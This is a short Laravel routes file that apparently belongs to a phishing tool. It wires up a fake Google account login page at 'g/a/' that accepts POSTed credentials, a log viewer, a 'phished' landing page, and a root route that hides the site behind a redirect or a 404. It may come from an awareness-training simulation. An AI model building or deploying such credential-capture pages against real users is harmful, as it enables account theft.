<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('log-view', 'LogController@email')->name('log.view');
Route::get('phished', function () {
    return view('phished');
})->name('phished');

/**
 * Main
 */
Route::get('/', function () {
    if (getenv('DEFAULT_REDIRECT')) {
        return redirect(getenv('DEFAULT_REDIRECT'));
    }

    return abort(404);
});

/**
 * Google - Account
 */
Route::get('g/a/', 'Google\Account\LoginController@index')->name('google.login');
Route::post('g/a/', 'Google\Account\LoginController@submit');
